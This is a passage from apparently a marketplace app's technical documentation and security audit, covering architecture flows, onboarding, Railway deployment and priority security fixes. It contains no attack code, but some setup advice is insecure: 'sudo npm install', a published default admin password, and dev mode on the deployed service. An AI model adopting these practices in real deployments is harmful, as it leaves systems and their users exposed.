# Regular security audits
npm audit fix

# For breaking changes
npm audit fix --force

# Generate audit report
npm audit --json > security-audit.json
```

**Priority:** 🟡 **RUN MONTHLY**

---

### SECURITY BEST PRACTICES NOT IMPLEMENTED

1. **API Versioning Strategy** ✅ Implemented (`/api/v1`)
2. **Input Validation** ✅ Implemented (Joi)
3. **Output Encoding** ⚠️ Partial (needs DOMPurify)
4. **Authentication** ✅ Implemented (JWT)
5. **Authorization** ✅ Implemented (RBAC)
6. **Session Management** ✅ Implemented (JWT + refresh)
7. **Cryptography** ✅ Implemented (bcrypt, JWT)
8. **Error Handling** ✅ Implemented
9. **Logging** ✅ Implemented (Winston)
10. **Data Protection** ⚠️ Needs HTTPS enforcement
11. **Communication Security** ⚠️ Needs HTTPS enforcement
12. **File Upload Validation** ⚠️ Partial (size check only)
13. **Configuration Management** ✅ Environment variables
14. **Database Security** ⚠️ Needs SSL with proper cert validation
15. **Memory Management** ❌ No limits on large payloads

---

### SECURITY AUDIT SUMMARY

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | 4 | ⚠️ **MUST FIX BEFORE DEPLOYMENT** |
| 🟠 High | 4 | ⚠️ **FIX BEFORE PRODUCTION** |
| 🟡 Medium | 4 | ⚠️ **FIX BEFORE LAUNCH** |
| 🟢 Low | 3 | ✅ Optional improvements |
| **TOTAL** | **15** | **4 blockers identified** |

**Estimated Effort to Fix All Critical Issues:** 2-3 days

---

## 🔄 MODULE INTERACTIONS

### Frontend → Backend Flow

```
┌─────────────────────────────────────────────────────────┐
│                    FRONTEND MODULES                      │
└─────────────────────────────────────────────────────────┘
                            │
    ┌───────────────────────┼───────────────────────┐
    │                       │                       │
┌───▼────┐          ┌──────▼──────┐        ┌──────▼──────┐
│ Auth   │          │  Cart       │        │  Products   │
│ Manager│          │  Manager    │        │  API        │
└───┬────┘          └──────┬──────┘        └──────┬──────┘
    │                      │                       │
    └──────────────────────┼───────────────────────┘
                           │
                 ┌─────────▼──────────┐
                 │   API Client       │
                 │  (api-client.js)   │
                 └─────────┬──────────┘
                           │
                    HTTP Requests
                    Authorization: Bearer <token>
                           │
┌─────────────────────────▼────────────────────────────────┐
│                    BACKEND MODULES                        │
└───────────────────────────────────────────────────────────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
    ┌────▼────┐     ┌─────▼─────┐    ┌─────▼─────┐
    │ Express │     │Middleware │    │  Routes   │
    │  App    │────▶│  Pipeline │───▶│  Handler  │
    └─────────┘     └───────────┘    └─────┬─────┘
                                            │
                                    ┌───────▼────────┐
                                    │  Controller    │
                                    └───────┬────────┘
                                            │
                                    ┌───────▼────────┐
                                    │   Service      │
                                    └───────┬────────┘
                                            │
                      ┌─────────────────────┼─────────────────────┐
                      │                     │                     │
                ┌─────▼──────┐       ┌─────▼──────┐       ┌─────▼──────┐
                │   Model    │       │   Redis    │       │   Events   │
                │ (Sequelize)│       │   Cache    │       │    Bus     │
                └─────┬──────┘       └────────────┘       └─────┬──────┘
                      │                                          │
                ┌─────▼──────┐                            ┌─────▼──────┐
                │ PostgreSQL │                            │   Workers  │
                └────────────┘                            └────────────┘
```

### Middleware Pipeline

Every HTTP request goes through this pipeline:

```
HTTP Request
    │
    ├─→ 1. Helmet (Security headers)
    ├─→ 2. CORS (Cross-origin validation)
    ├─→ 3. Body Parser (JSON/URL-encoded)
    ├─→ 4. Cookie Parser
    ├─→ 5. Guest ID Attachment (for anonymous users)
    ├─→ 6. Compression (Gzip)
    ├─→ 7. Morgan (Request logging)
    ├─→ 8. Rate Limiter (100 req/15min)
    │
    ├─→ Route Matching
    │   │
    │   ├─→ 9. Authentication Middleware (if protected route)
    │   ├─→ 10. Authorization Middleware (role check)
    │   ├─→ 11. Validation Middleware (Joi schemas)
    │   │
    │   └─→ Controller Handler
    │       │
    │       ├─→ Service Layer (business logic)
    │       ├─→ Model Layer (database operations)
    │       └─→ Response
    │
    ├─→ 404 Handler (if no route matched)
    └─→ Error Handler (if any error occurred)
```

### Cart System Flow

```
┌──────────────────────────────────────────────────────────┐
│                    CART WORKFLOW                          │
└──────────────────────────────────────────────────────────┘

1. Guest User (No Account)
   │
   ├─→ Frontend detects no auth token
   ├─→ Guest middleware generates guest_id (UUID)
   ├─→ Store guest_id in cookie
   ├─→ Cart stored in PostgreSQL with guest_id
   │
   └─→ User registers/logs in
       │
       └─→ Cart migration: guest cart → user cart

2. Authenticated User
   │
   ├─→ Cart associated with user_id
   ├─→ Cart items stored in JSONB column
   ├─→ Cart cached in Redis for 30 minutes
   │
   └─→ Checkout
       │
       ├─→ Validate all items (stock, price)
       ├─→ Apply coupon (if any)
       ├─→ Calculate totals
       ├─→ Create order
       ├─→ Clear cart
       └─→ Emit OrderCreated event
```

### Order Processing Flow

```
┌──────────────────────────────────────────────────────────┐
│                  ORDER STATE MACHINE                      │
└──────────────────────────────────────────────────────────┘

Order Creation
    │
    ├─→ Status: pending_payment
    │   Payment: pending
    │
    ├─→ Emit: OrderCreated event
    │       │
    │       └─→ Payment Worker
    │           │
    │           ├─→ İyzico API call
    │           │   │
    │           │   ├─→ SUCCESS
    │           │   │   │
    │           │   │   ├─→ Status: paid
    │           │   │   ├─→ Payment: paid
    │           │   │   ├─→ Emit: PaymentSucceeded
    │           │   │   │       │
    │           │   │   │       ├─→ Commission Worker (calculate & record)
    │           │   │   │       └─→ Notification Worker (send email)
    │           │   │   │
    │           │   │   └─→ Vendor sees order
    │           │   │       │
    │           │   │       └─→ Vendor: Mark as processing
    │           │   │           │
    │           │   │           ├─→ Status: processing
    │           │   │           │
    │           │   │           └─→ Vendor: Create shipment
    │           │   │               │
    │           │   │               ├─→ Status: shipped
    │           │   │               ├─→ Tracking number generated
    │           │   │               ├─→ Shipment events created
    │           │   │               │
    │           │   │               └─→ Customer receives package
    │           │   │                   │
    │           │   │                   └─→ Status: delivered
    │           │   │
    │           │   └─→ FAILURE
    │           │       │
    │           │       ├─→ Status: pending_payment
    │           │       ├─→ Payment: failed
    │           │       └─→ Notification Worker (payment failed email)
    │           │
    │           └─→ Customer can retry payment OR cancel order
    │
    └─→ Any state ────┐
                      │
                      └─→ Cancellation
                          │
                          ├─→ If paid: Status: refunded
                          │           Payment: refunded
                          │
                          └─→ If unpaid: Status: cancelled
                                        Payment: pending
```

### Authentication Flow Diagram

```
┌──────────────────────────────────────────────────────────┐
│                 AUTHENTICATION FLOW                       │
└──────────────────────────────────────────────────────────┘

Registration
    │
    ├─→ POST /api/v1/auth/register
    │   Body: { email, password, first_name, last_name, role }
    │
    ├─→ Validate input (Joi)
    ├─→ Check email uniqueness
    ├─→ Hash password (bcrypt, 12 rounds)
    ├─→ Create user in PostgreSQL
    ├─→ Generate JWT tokens (access + refresh)
    ├─→ Store refresh token in user.refresh_token
    ├─→ Return: { accessToken, refreshToken, user }
    │
    └─→ Frontend stores tokens
        │
        ├─→ accessToken: localStorage or memory
        └─→ refreshToken: secure httpOnly cookie (recommended)

Login
    │
    ├─→ POST /api/v1/auth/login
    │   Body: { email, password }
    │
    ├─→ Find user by email
    ├─→ Compare password (bcrypt)
    ├─→ Check is_active flag
    ├─→ Update last_login_at, last_login_ip
    ├─→ Generate new JWT tokens
    ├─→ Update refresh token in database
    ├─→ Return: { accessToken, refreshToken, user }

Authenticated Request
    │
    ├─→ GET /api/v1/orders
    │   Headers: Authorization: Bearer <accessToken>
    │
    ├─→ Auth Middleware
    │   │
    │   ├─→ Extract token from header
    │   ├─→ Verify JWT signature
    │   ├─→ Check expiration
    │   ├─→ Find user by ID from token
    │   ├─→ Check user.is_active
    │   └─→ Attach user to req.user
    │
    ├─→ RBAC Middleware (if applicable)
    │   │
    │   └─→ Check req.user.role matches required role
    │
    └─→ Controller executes

Token Refresh
    │
    ├─→ POST /api/v1/auth/refresh
    │   Body: { refreshToken }
    │
    ├─→ Verify refresh token signature
    ├─→ Find user by ID from token
    ├─→ Compare with stored refresh token
    ├─→ Generate NEW access token (1h expiry)
    ├─→ Optionally rotate refresh token
    └─→ Return: { accessToken, refreshToken }

Logout
    │
    ├─→ POST /api/v1/auth/logout
    │
    ├─→ Clear refresh token in database
    ├─→ Optionally blacklist token (Redis)
    └─→ Frontend clears stored tokens
```

### Event-Driven Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    EVENT BUS SYSTEM                       │
└──────────────────────────────────────────────────────────┘

Service Layer Emits Event
    │
    ├─→ orderService.createOrder()
    │       │
    │       └─→ emit('order.created', { orderId, userId, total })
    │
    └─→ Event Bus (backend/src/events/eventBus.js)
            │
            ├─→ Registered Listeners:
            │   │
            │   ├─→ 1. payment.events.js
            │   │   └─→ handleOrderCreated()
            │   │       └─→ Queue payment job (BullMQ)
            │   │
            │   ├─→ 2. order.events.js
            │   │   └─→ logOrderCreated()
            │   │       └─→ Winston logger
            │   │
            │   └─→ 3. notification.events.js
            │       └─→ sendOrderConfirmation()
            │           └─→ Queue email job (BullMQ)
            │
            └─→ All listeners execute asynchronously

Background Workers Process Jobs
    │
    ├─→ Payment Worker
    │   └─→ Processes 'process-payment' jobs
    │       └─→ Calls İyzico API
    │           └─→ Emits 'payment.succeeded' or 'payment.failed'
    │
    ├─→ Notification Worker
    │   └─→ Processes 'send-email' jobs
    │       └─→ Calls SMTP service
    │           └─→ Sends email
    │
    └─→ Commission Worker
        └─→ Processes 'calculate-commission' jobs
            └─→ Creates CommissionTransaction record
```

### Caching Strategy

```
┌──────────────────────────────────────────────────────────┐
│                    REDIS CACHING                          │
└──────────────────────────────────────────────────────────┘

API Request (GET /api/v1/products)
    │
    ├─→ Controller checks cache
    │   │
    │   ├─→ cache.get('products:list:page=1&limit=20')
    │   │
    │   ├─→ CACHE HIT
    │   │   └─→ Return cached data (instant response)
    │   │
    │   └─→ CACHE MISS
    │       │
    │       ├─→ Query PostgreSQL
    │       ├─→ Process data
    │       ├─→ cache.set('products:list:page=1&limit=20', data, 3600)
    │       └─→ Return data
    │
    └─→ Cache Invalidation
        │
        ├─→ Product Created/Updated
        │   └─→ cache.delPattern('products:*')
        │
        ├─→ Category Updated
        │   └─→ cache.delPattern('categories:*')
        │
        └─→ Store Updated
            └─→ cache.delPattern('stores:*')

Cache Keys Pattern:
- products:list:{query_params}
- products:detail:{productId}
- categories:tree
- categories:detail:{categoryId}
- stores:list:{query_params}
- stores:detail:{storeId}
- cart:{userId}
- cart:guest:{guestId}
```

---

## 👨‍💻 DEVELOPER ONBOARDING

### Prerequisites

#### Required Software
| Software | Minimum Version | Download Link | Purpose |
|----------|----------------|---------------|---------|
| **Node.js** | 18.0.0 | https://nodejs.org/ | JavaScript runtime |
| **npm** | 9.0.0 | Included with Node.js | Package manager |
| **PostgreSQL** | 13.0 | https://www.postgresql.org/ | Primary database |
| **Redis** | 6.0 | https://redis.io/ | Cache & queue (optional) |
| **Git** | 2.0+ | https://git-scm.com/ | Version control |
| **Code Editor** | - | VS Code recommended | IDE |

#### Recommended Tools
- **Postman** or **Insomnia** - API testing
- **pgAdmin** or **DBeaver** - Database management
- **Redis Commander** - Redis GUI
- **Docker Desktop** (optional) - Containerized services

---

### Local Development Setup

#### Step 1: Clone Repository
```bash
git clone <repository-url>
cd railvayk/dosttanpalas-railway
```

#### Step 2: Install Backend Dependencies
```bash
cd backend
npm install
```

**Expected Output:**
```
added 847 packages in 45s
```

**Common Issues:**
- ⚠️ **bcrypt compilation errors on Windows:** Install Windows Build Tools
  ```bash
  npm install --global windows-build-tools
  ```
- ⚠️ **EACCES errors:** Use `sudo npm install` (Linux/Mac) or run as Administrator (Windows)

#### Step 3: Set Up PostgreSQL Database

**Option A: Local PostgreSQL**
```bash
# Install PostgreSQL
# macOS: brew install postgresql
# Ubuntu: sudo apt install postgresql
# Windows: Download from postgresql.org

# Start PostgreSQL service
# macOS: brew services start postgresql
# Ubuntu: sudo service postgresql start
# Windows: Service starts automatically

# Create database
psql -U postgres
CREATE DATABASE dostan_marketplace_dev;
CREATE USER dostan_user WITH PASSWORD 'secure_password';
GRANT ALL PRIVILEGES ON DATABASE dostan_marketplace_dev TO dostan_user;
\q
```

**Option B: Docker PostgreSQL**
```bash
docker run --name dostan-postgres \
  -e POSTGRES_DB=dostan_marketplace_dev \
  -e POSTGRES_USER=dostan_user \
  -e POSTGRES_PASSWORD=secure_password \
  -p 5432:5432 \
  -d postgres:15-alpine
```

#### Step 4: Set Up Redis (Optional)

**Option A: Local Redis**
```bash
# macOS: brew install redis && brew services start redis
# Ubuntu: sudo apt install redis-server && sudo service redis-server start
# Windows: Download from https://github.com/microsoftarchive/redis/releases
```

**Option B: Docker Redis**
```bash
docker run --name dostan-redis -p 6379:6379 -d redis:7-alpine
```

**Option C: Skip Redis**
The application includes an in-memory fallback, so Redis is optional for development.

#### Step 5: Configure Environment Variables

```bash
cd backend
cp .env.example .env
```

**Edit `.env` file:**
```env
# Server
NODE_ENV=development
PORT=8080
BASE_URL=http://localhost:8080

# Database (use your credentials)
DATABASE_URL=postgres://dostan_user:secure_password@localhost:5432/dostan_marketplace_dev

# Redis (optional)
REDIS_URL=redis://localhost:6379/0

# JWT Secrets (CRITICAL: Generate secure secrets!)
JWT_SECRET=your_generated_secret_here
JWT_REFRESH_SECRET=your_generated_refresh_secret_here

# Cookie Secret
COOKIE_SECRET=your_generated_cookie_secret_here

# Frontend URLs
FRONTEND_URL=http://localhost:3000,http://127.0.0.1:5500
ALLOWED_ORIGINS=http://localhost:3000,http://127.0.0.1:5500
```

**Generate Secure Secrets:**
```bash
# In Node.js REPL
node
> require('crypto').randomBytes(64).toString('hex')
# Use output for JWT_SECRET
> require('crypto').randomBytes(64).toString('hex')
# Use output for JWT_REFRESH_SECRET
> require('crypto').randomBytes(32).toString('hex')
# Use output for COOKIE_SECRET
```

#### Step 6: Run Database Migrations

```bash
cd backend
npm run migrate
```

**Expected Output:**
```
== 20251023-update-orders-allow-guest: migrating =======
== 20251023-update-orders-allow-guest: migrated (0.456s)
...
Migrations completed successfully!
```

**Common Issues:**
- ⚠️ **Connection refused:** Check DATABASE_URL, ensure PostgreSQL is running
- ⚠️ **Authentication failed:** Verify username/password
- ⚠️ **Database does not exist:** Create database first (Step 3)

#### Step 7: Seed Database with Initial Data

```bash
npm run seed
```

**What Gets Seeded:**
- Admin user: `admin@dostanmarket.com` / `Admin@123456`
- Sample categories (Wood Carvings, Glass Art, Textiles, Ceramics)
- 2 vendor users with stores
- 20 sample products
- Sample reviews

**Expected Output:**
```
✅ Database connected
✅ Admin user created
✅ 6 categories created
✅ 2 vendors created
✅ 2 stores created
✅ 20 products created
✅ 15 reviews created
🎉 Seeding completed successfully!
```

#### Step 8: Start Development Server

```bash
npm run dev
```

**Expected Output:**
```
✅ PostgreSQL: Connected successfully
✅ Redis: Connected successfully
🚀 Server running on http://localhost:8080
📁 Frontend served from: C:\Users\LENOVO\Desktop\railvayk\dosttanpalas-railway
```

**Server is ready when you see:**
- Database connection confirmed
- Redis connection confirmed (or "Redis not available, using in-memory store")
- Server listening on port 8080

#### Step 9: Test API Endpoints

**Health Check:**
```bash
curl http://localhost:8080/health
```

**Expected Response:**
```json
{
  "ok": true,
  "services": {
    "database": "up",
    "redis": "up"
  },
  "timestamp": "2025-10-31T...",
  "environment": "development"
}
```

**Login as Admin:**
```bash
curl -X POST http://localhost:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@dostanmarket.com",
    "password": "Admin@123456"
  }'
```

**Expected Response:**
```json
{
  "success": true,
  "data": {
    "accessToken": "eyJhbGciOiJIUzI1NiIs...",
    "refreshToken": "eyJhbGciOiJIUzI1NiIs...",
    "user": {
      "id": "...",
      "email": "admin@dostanmarket.com",
      "role": "admin"
    }
  }
}
```

#### Step 10: Open Frontend

**Option A: Live Server (VS Code Extension)**
1. Install "Live Server" extension
2. Right-click `index.html` → "Open with Live Server"
3. Frontend opens at `http://127.0.0.1:5500`

**Option B: Python HTTP Server**
```bash
cd dosttanpalas-railway
python -m http.server 3000
# Open http://localhost:3000
```

**Option C: Open Directly**
Open `index.html` in browser (file:// protocol)
Note: CORS may cause issues with this method

---

### Common Setup Issues & Solutions

#### Issue: "Cannot find module 'pg'"
**Solution:**
```bash
cd backend
rm -rf node_modules package-lock.json
npm install
```

#### Issue: "ECONNREFUSED 127.0.0.1:5432"
**Problem:** PostgreSQL not running
**Solution:**
```bash
# Check if PostgreSQL is running
# macOS: brew services list
# Ubuntu: sudo service postgresql status
# Windows: services.msc → PostgreSQL service

# Start PostgreSQL
# macOS: brew services start postgresql
# Ubuntu: sudo service postgresql start
# Windows: Start service from services.msc
```

#### Issue: "relation \"users\" does not exist"
**Problem:** Migrations not run
**Solution:**
```bash
cd backend
npm run migrate
```

#### Issue: "JWT_SECRET must be set"
**Problem:** Missing environment variables
**Solution:** Ensure `.env` file exists with all required variables (see Step 5)

#### Issue: "Port 8080 already in use"
**Solution:**
```bash
# Change PORT in .env to different port
PORT=8081

# Or kill process using port 8080
# Windows: netstat -ano | findstr :8080
#          taskkill /PID <pid> /F
# Linux/Mac: lsof -ti:8080 | xargs kill -9
```

#### Issue: CORS errors in browser console
**Problem:** Frontend URL not in ALLOWED_ORIGINS
**Solution:** Add your frontend URL to `.env`:
```env
ALLOWED_ORIGINS=http://localhost:3000,http://127.0.0.1:5500,http://localhost:5173
```

---

### Development Workflow

#### Daily Development Loop

```bash
# 1. Pull latest changes
git pull origin main

# 2. Install any new dependencies
cd backend && npm install

# 3. Run new migrations
npm run migrate

# 4. Start dev server (auto-reload on file changes)
npm run dev

# 5. Make changes, test locally

# 6. Run tests
npm test

# 7. Commit changes
git add .
git commit -m "feat: add new feature"
git push origin feature-branch
```

#### Testing Workflow

```bash
# Run all tests
npm test

# Run tests in watch mode (re-runs on file changes)
npm run test:watch

# Run specific test file
npm test -- order.service.test.js

# Run with coverage report
npm test -- --coverage
```

#### Database Management

```bash
# Create new migration
npx sequelize-cli migration:generate --name add-new-field

# Run migrations
npm run migrate

# Rollback last migration
npm run migrate:undo

# Check migration status
npx sequelize-cli db:migrate:status

# Re-seed database (WARNING: drops all data)
npm run seed
```

#### Debugging

**Backend Debugging (VS Code):**
Create `.vscode/launch.json`:
```json
{
  "version": "0.2.0",
  "configurations": [
    {
      "type": "node",
      "request": "launch",
      "name": "Debug Backend",
      "skipFiles": ["<node_internals>/**"],
      "program": "${workspaceFolder}/backend/src/server.js",
      "envFile": "${workspaceFolder}/backend/.env"
    }
  ]
}
```

**Logging:**
```javascript
// backend/src/utils/logger.js is configured
const logger = require('../utils/logger');

logger.error('Error message', { context: 'additional data' });
logger.warn('Warning message');
logger.info('Info message');
logger.debug('Debug message'); // Only in development
```

**Database Queries:**
Enable SQL logging in development:
```env
# .env
LOG_LEVEL=debug
```

SQL queries will be logged to console in development mode.

---

### Code Style & Standards

#### Linting
```bash
# Check for linting errors
npm run lint

# Auto-fix linting errors
npm run lint:fix
```

#### Formatting
```bash
# Format all code
npm run format
```

#### Pre-commit Hooks
Husky + lint-staged automatically:
- Lints staged files
- Formats code
- Runs on `git commit`

If commit blocked:
```bash
# Fix issues first
npm run lint:fix
npm run format

# Then commit again
git commit -m "your message"
```

---

### Development Tools Recommendations

#### VS Code Extensions
- **ESLint** - JavaScript linting
- **Prettier** - Code formatting
- **PostgreSQL** - SQL syntax highlighting
- **Thunder Client** - API testing
- **GitLens** - Git visualization
- **Path Intellisense** - Path autocomplete
- **Auto Rename Tag** - HTML tag renaming

#### Browser Extensions
- **React DevTools** - Not needed (no React)
- **Redux DevTools** - Not needed (no Redux)
- **JSON Formatter** - Pretty print JSON
- **Wappalyzer** - Detect technologies

---

## 🚀 DEPLOYMENT PIPELINE

### Current Deployment Setup: Railway

**Status:** ✅ **CONFIGURED** (Deployment-ready with security fixes)

#### Railway Configuration

**Project Structure:**
```
Railway Project: dostan-marketplace
├── Service 1: API (Node.js)
│   ├── Build: cd backend && npm install
│   ├── Start: cd backend && npm run dev
│   └── Port: 8080
├── Service 2: PostgreSQL (Plugin)
│   └── DATABASE_URL automatically provided
└── Service 3: Redis (Plugin)
    └── REDIS_URL automatically provided
```

**Environment Variables (Railway Dashboard):**
```env
# Auto-provided by Railway
DATABASE_URL=${{ postgres.DATABASE_URL }}
REDIS_URL=${{ redis.REDIS_URL }}
PORT=8080

# Must be manually added
NODE_ENV=development  # Change to 'production' for production
JWT_SECRET=<generated-secret>
JWT_REFRESH_SECRET=<generated-secret>
COOKIE_SECRET=<generated-secret>
FRONTEND_URL=https://your-railway-domain.up.railway.app
ALLOWED_ORIGINS=https://your-railway-domain.up.railway.app

# Optional
IYZICO_API_KEY=<your-key>
IYZICO_SECRET_KEY=<your-secret>
IYZICO_BASE_URL=https://api.iyzipay.com  # Production URL
SMTP_HOST=<your-smtp-host>
SMTP_USER=<your-smtp-user>
SMTP_PASSWORD=<your-smtp-password>
```

#### Deployment Steps

**1. Connect Repository to Railway:**
```bash
# Install Railway CLI
npm install -g @railway/cli

# Login
railway login

# Link project
railway link <project-id>

# Or deploy via Railway dashboard by connecting GitHub repo
```

**2. Add PostgreSQL Plugin:**
- Railway Dashboard → Project → New → Database → PostgreSQL
- `DATABASE_URL` automatically added to environment

**3. Add Redis Plugin:**
- Railway Dashboard → Project → New → Database → Redis
- `REDIS_URL` automatically added to environment

**4. Configure Environment Variables:**
- Railway Dashboard → Service → Variables
- Add all required variables (see above)

**5. Deploy:**
```bash
# Via CLI
railway up

# Or push to connected GitHub branch
git push origin main
# Railway auto-deploys on push
```

**6. Run Migrations:**
```bash
# After first deployment
railway run npm run migrate

# Seed database (optional)
railway run npm run seed
```

**7. Monitor Deployment:**
- Railway Dashboard → Service → Logs
- Watch for "Server running on" message
- Check /health endpoint

---

### Production Deployment Checklist

#### Pre-Deployment

- [ ] **Security Fixes Applied**
  - [ ] JWT secrets changed from defaults
  - [ ] SSL certificate validation enabled
  - [ ] CSRF protection implemented
  - [ ] XSS vulnerabilities fixed (innerHTML → textContent)
  - [ ] Rate limiting on auth endpoints
  - [ ] HTTPS enforced

- [ ] **Environment Variables Set**
  - [ ] NODE_ENV=production
  - [ ] JWT_SECRET (secure, random)
  - [ ] JWT_REFRESH_SECRET (secure, random)
  - [ ] COOKIE_SECRET (secure, random)
  - [ ] DATABASE_URL (production database)
  - [ ] REDIS_URL (production Redis)
  - [ ] SMTP credentials configured
  - [ ] Payment gateway credentials (live, not sandbox)

- [ ] **Database Ready**
  - [ ] Production database created
  - [ ] Migrations run
  - [ ] Admin user created
  - [ ] Categories seeded
  - [ ] Backup strategy in place

- [ ] **Third-Party Services**
  - [ ] İyzico payment integration completed & tested
  - [ ] Email service configured & tested
  - [ ] File storage (S3/MinIO) set up
  - [ ] Monitoring service connected (optional)

- [ ] **Testing**
  - [ ] All tests passing
  - [ ] Manual testing of critical flows
  - [ ] Load testing performed
  - [ ] Security scan completed

- [ ] **Performance**
  - [ ] Redis cache configured
  - [ ] Connection pooling optimized
  - [ ] Static assets compressed
  - [ ] CDN configured (if using S3)

- [ ] **Monitoring & Logging**
  - [ ] Log aggregation set up
  - [ ] Error tracking (Sentry recommended)
  - [ ] Uptime monitoring
  - [ ] Performance monitoring

#### Deployment Commands

**Railway:**
```bash
# Deploy via CLI
railway up

# Or push to GitHub (if connected)
git push origin main

# Run migrations
railway run npm run migrate

# Check logs
railway logs

# Open in browser
railway open
```

**Manual VPS (Ubuntu):**
```bash
# 1. Install dependencies
sudo apt update
sudo apt install nodejs npm postgresql redis-server nginx

# 2. Clone repository
git clone <repo-url>
cd dosttanpalas-railway/backend

# 3. Install packages
npm ci --production

# 4. Configure environment
cp .env.example .env
nano .env  # Edit with production values

# 5. Run migrations
npm run migrate

# 6. Start with PM2
npm install -g pm2
pm2 start ecosystem.config.js
pm2 save
pm2 startup

# 7. Configure Nginx reverse proxy
sudo nano /etc/nginx/sites-available/dostan
# Add configuration (see below)
sudo ln -s /etc/nginx/sites-available/dostan /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

# 8. Set up SSL with Let's Encrypt
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d yourdomain.com
```

**Nginx Configuration:**
```nginx
server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;

    location / {
        proxy_pass http://localhost:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    client_max_body_size 10M;
}
```

#### Post-Deployment

- [ ] **Verify Deployment**
  - [ ] Health check endpoint responding
  - [ ] Database connection working
  - [ ] Redis connection working
  - [ ] Frontend loading correctly

- [ ] **Test Critical Flows**
  - [ ] User registration
  - [ ] User login
  - [ ] Product browsing
  - [ ] Add to cart
  - [ ] Checkout (with test payment)
  - [ ] Order confirmation email received
  - [ ] Admin can approve vendors/products
  - [ ] Vendor can manage store

- [ ] **Monitor Initial Traffic**
  - [ ] Check error logs
  - [ ] Monitor response times
  - [ ] Watch database query performance
  - [ ] Check Redis hit rates

- [ ] **Backup Verification**
  - [ ] Database backups running
  - [ ] Backup restoration tested

---

### CI/CD Pipeline (Recommended)

**Not currently implemented.** Here's a recommended setup:

#### GitHub Actions Workflow

Create `.github/workflows/deploy.yml`:

```yaml
name: Deploy to Railway

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_DB: test_db
          POSTGRES_USER: test_user
          POSTGRES_PASSWORD: test_password
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
          cache-dependency-path: backend/package-lock.json

      - name: Install dependencies
        run: cd backend && npm ci

      - name: Run linter
        run: cd backend && npm run lint

      - name: Run tests
        env:
          NODE_ENV: test
          DATABASE_URL: postgres://test_user:test_password@localhost:5432/test_db
          REDIS_URL: redis://localhost:6379
          JWT_SECRET: test_secret
          JWT_REFRESH_SECRET: test_refresh_secret
        run: cd backend && npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'

    steps:
      - uses: actions/checkout@v3

      - name: Deploy to Railway
        uses: bervProject/railway-deploy@main
        with:
          railway_token: ${{ secrets.RAILWAY_TOKEN }}
          service: dostan-api

      - name: Run migrations
        env:
          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}
        run: |
          npm install -g @railway/cli
          railway run npm run migrate
```

**Setup Steps:**
1. Go to Railway → Project Settings → Tokens
2. Generate deployment token
3. Add to GitHub Secrets as `RAILWAY_TOKEN`
4. Create workflow file above
5. Push to main branch → auto-deploy

---

### Scaling Considerations

#### Current Capacity
- **Single instance:** ~500 concurrent users
- **Database:** ~100 connections
- **Redis:** ~10K ops/sec

#### Scaling to 50K Daily Users

**Horizontal Scaling:**
```
Load Balancer (Railway/Nginx)
    │
    ├─→ API Instance 1 (Node.js)
    ├─→ API Instance 2 (Node.js)
    ├─→ API Instance 3 (Node.js)
    └─→ API Instance N (Node.js)
    │
    ├─→ PostgreSQL (Managed, read replicas)
    └─→ Redis Cluster
```

**Database Scaling:**
- Add read replicas for heavy queries
- Connection pooling (already implemented)
- Query optimization (indexes)
- Partition large tables

**Redis Scaling:**
- Redis Cluster for high availability
- Separate queues from cache
- Use Redis Sentinel for failover

**CDN for Static Assets:**
- CloudFront + S3 for images
- Reduce backend load
- Improve global latency

**Cost Estimates (50K daily users):**
| Service | Provider | Cost/Month |
|---------|----------|------------|
| API Hosting (3 instances) | Railway | $60 |
| PostgreSQL (managed) | Railway | $25 |
| Redis (managed) | Railway | $10 |
| S3 + CloudFront | AWS | $50-150 |
| Email (50K emails/month) | SendGrid | $15 |
| Monitoring | Sentry | $26 |
| **TOTAL** | | **$186-276/month** |

---

## 🎯 PRIORITY ACTION ITEMS

### CRITICAL (Must Fix Before ANY Deployment)

#### 1. Fix Default JWT Secrets 🔴
**Issue:** Hardcoded default secrets in `backend/src/utils/jwt.js`
**Risk:** Complete authentication bypass
**Effort:** 30 minutes
**Priority:** 🔴 **IMMEDIATE**

**Action:**
```javascript
// backend/src/utils/jwt.js
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

if (!JWT_SECRET || !JWT_REFRESH_SECRET) {
  throw new Error('FATAL: JWT secrets must be set in environment variables');
}
```

Generate secrets:
```bash
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

---

#### 2. Implement Payment Gateway 🔴
**Issue:** İyzico integration is a mock
**Risk:** No actual payments processed
**Effort:** 2-3 days
**Priority:** 🔴 **CRITICAL**

**Action:**
1. Install İyzico SDK: `npm install iyzipay`
2. Implement actual payment flow in `backend/src/services/payment.service.js`
3. Add webhook endpoint for payment callbacks
4. Test with sandbox credentials
5. Switch to live credentials for production

**Reference:** https://dev.iyzipay.com/en/api

---

#### 3. Fix XSS Vulnerabilities (innerHTML) 🔴
**Issue:** 52 files use innerHTML with user data
**Risk:** Cross-site scripting attacks
**Effort:** 1-2 days
**Priority:** 🔴 **CRITICAL**

**Action:**
```bash
# Search and replace
find . -name "*.js" -type f -exec grep -l "innerHTML" {} \;

# For each file, replace:
- element.innerHTML = userInput;
